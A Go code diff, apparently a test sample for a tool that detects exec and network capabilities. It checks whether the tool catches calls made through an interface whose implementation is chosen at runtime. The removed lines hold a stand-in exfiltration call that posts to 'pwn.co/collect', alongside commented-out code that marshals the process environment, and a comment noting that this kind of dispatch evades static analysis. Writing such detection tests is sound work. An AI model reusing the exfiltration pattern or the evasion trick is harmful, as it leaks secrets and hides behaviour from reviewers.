@@ -1,38 +1,52 @@
 package main
 
 import (
-	//"os"
-	//"os/exec"
-      	//"encoding/json"
+	"fmt"
+	"os"
+	"os/exec"
 	"net/http"
-	//"bytes"
 )
 
-type Fooer interface {
-	Foo()
+type DynamicMethodInterface interface {
+    	Invoke()
 }
 
-type Bar struct{}
-
-func (b Bar) Foo() {
-        //cmd := exec.Command("ls")
-        //cmd.Stdout = os.Stdout
-        //_ = cmd.Run()
-
-// 	jsonPayload,_ := json.Marshal(os.Environ())
-//      payloadBuffer := bytes.NewBuffer(jsonPayload)
-
-        // Perform the HTTP POST request
-        response, _ := http.Post("http://pwn.co/collect", "application/json", nil)
-        defer response.Body.Close()
-
+type MethodA struct{}
+func (m MethodA) Invoke() {
+    	fmt.Println("Invoked Method A: CAPABILITY_EXEC")
+	cmd := exec.Command("ls")
+	cmd.Stdout = os.Stdout
+	_ = cmd.Run()
 }
 
-func invokeFoo(f Fooer) {
-	f.Foo() // Method invocation not captured by static analysis if Fooer implementation is determined at runtime
+type MethodB struct{}
+func (m MethodB) Invoke() {
+
+    	fmt.Println("Invoked Method B: CAPABILITY_NETWORK")
+	resp, err := http.Get("https://www.google.com")
+    	if err != nil {
+        	fmt.Println("Error:", err)
+        	return
+    	}
+    	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+        	fmt.Println("Error: Unexpected status code %d\n", resp.StatusCode)
+        	return
+    	} else {
+		fmt.Println("GET request successfully made\n")
+	}
 }
 
 func main() {
-	var b Bar
-	invokeFoo(b)
+
+	methodA := MethodA{}
+	methodB := MethodB{}
+
+	invokeMethod(methodA)
+	invokeMethod(methodB)
+}
+
+func invokeMethod(method DynamicMethodInterface) {
+	method.Invoke()
 }
